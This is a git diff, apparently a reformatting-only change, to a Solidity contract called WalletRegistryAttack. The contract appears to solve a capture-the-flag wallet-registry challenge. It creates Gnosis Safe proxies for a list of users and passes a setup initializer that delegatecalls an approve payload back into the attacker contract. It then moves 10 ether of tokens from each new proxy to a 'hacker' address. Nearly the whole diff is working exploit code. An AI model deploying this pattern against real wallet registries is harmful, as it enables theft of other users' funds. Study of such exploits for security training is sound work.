@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+
 interface ProxyFactory {
     function createProxyWithCallback(
         address _singleton,
@@ -13,12 +14,16 @@ interface ProxyFactory {
 }
 
 contract WalletRegistryAttack {
-
     address public masterCopyAddress;
     address public walletRegistryAddress;
     ProxyFactory proxyFactory;
 
-    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) {
+    constructor(
+        address _proxyFactoryAddress,
+        address _walletRegistryAddress,
+        address _masterCopyAddress,
+        address _token
+    ) {
         proxyFactory = ProxyFactory(_proxyFactoryAddress);
         walletRegistryAddress = _walletRegistryAddress;
         masterCopyAddress = _masterCopyAddress;
@@ -31,7 +36,11 @@ contract WalletRegistryAttack {
         IERC20(token).approve(spender, type(uint256).max);
     }
 
-    function attack(address tokenAddress, address hacker, address[] calldata users) public {
+    function attack(
+        address tokenAddress,
+        address hacker,
+        address[] calldata users
+    ) public {
         for (uint256 i = 0; i < users.length; i++) {
             // add the current user as the owner of the proxy
             address user = users[i];
@@ -39,14 +48,31 @@ contract WalletRegistryAttack {
             owners[0] = user;
 
             // encoded payload to approve tokens for this contract
-            bytes memory encodedApprove = abi.encodeWithSignature("approve(address,address)", address(this), tokenAddress);
+            bytes memory encodedApprove = abi.encodeWithSignature(
+                "approve(address,address)",
+                address(this),
+                tokenAddress
+            );
 
             // GnossisSafe::setup function that will be called on the newly created proxy
             // pass in the approve function to to delegateCalled by the proxy into this contract
-            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
-                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);
-            GnosisSafeProxy proxy =
-            proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));
+            bytes memory initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                owners,
+                1,
+                address(this),
+                encodedApprove,
+                address(0),
+                0,
+                0,
+                0
+            );
+            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
+                masterCopyAddress,
+                initializer,
+                0,
+                IProxyCreationCallback(walletRegistryAddress)
+            );
             // transfer the approved tokens
             IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);
         }
